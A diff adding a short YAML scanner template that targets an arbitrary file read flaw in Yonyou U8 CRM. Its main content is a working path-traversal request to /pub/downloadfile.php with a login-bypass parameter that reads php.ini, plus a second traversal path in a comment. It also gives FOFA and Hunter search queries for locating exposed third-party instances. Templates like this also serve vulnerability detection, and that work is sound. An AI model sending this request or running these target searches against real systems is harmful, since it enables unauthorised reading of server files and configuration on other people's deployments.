@@ -1,0 +1,16 @@
+name: yongyou-U8CRM-fileread       
+rules: 
+  - method: GET   
+    path: /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini
+    headers:    #/datacache/../../../../../../../U8SOFT/turbocrm70/php/php_browscap.ini
+    body:            
+    expression:                        
+      status_code:                
+      response_header:              
+      response_body: "About php.ini"
+
+detail:                          
+  description: "用友U8客户关系管理全面解决方案是基于中国企业最佳营销管理实践，更符合中国企业营销管理特点，客户关系管理的整合营销平台。用友crm pub/downloadfile.php接口存在任意文件读取漏洞。截至到2024.5.30较多网站存在该漏洞"
+  search:             
+    fofa: app="用友U8CRM"
+    鹰图: web.title="用友U8CRM" and icp.name!="" and icp.name!="用友网络科技股份有限公司" and icp.name!="北京金万维科技有限公司"
